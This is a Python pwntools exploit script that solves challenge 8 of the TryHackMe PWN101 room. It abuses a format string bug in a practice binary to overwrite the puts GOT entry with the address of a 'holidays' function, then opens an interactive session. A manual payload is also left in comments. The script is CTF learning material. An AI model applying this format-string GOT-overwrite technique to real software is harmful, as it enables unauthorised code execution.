#!/usr/bin/python3

# TryHackMe - Room PWN101 - Challenge 8

from pwn import *
from pwnlib.fmtstr import *
#context.log_level = 'debug'

# Attach GDB for local execution
#gdb.attach(
#    io,
#    """breakpoint *(main+0)
#    continue"""
#)

host = "10.10.10.10"
port = 9008
#io = remote(host, port)

executable = './108'
io = process(executable)
context.binary = binary = ELF(executable)
got_puts_address = binary.got.puts
holidays_address = binary.functions["holidays"]

##
## Address Fuzzer Candidates
##
fuzzed_index = 10
##

io.sendlineafter(b"=[Your name]: ", b"AAAA")

# Very manual exploitation
# payload = flat([
#     b"%64X%13$n",               # Writes 64 to index 13
#     b"%4603X%14$hnAAA",         # Writes 4603 to index 14
#     p64(got_puts_address + 2),  # Overwrites GOT offset by 2 bytes (first half)
#     p64(got_puts_address)       # Overwrites GOT only 2 bytes (second half)
# ])

# Exploit with PwnTools Library
payload = fmtstr_payload(fuzzed_index, { got_puts_address: holidays_address })
io.sendlineafter(b"=[Your Reg No]: ", payload)

io.recv()
io.interactive()
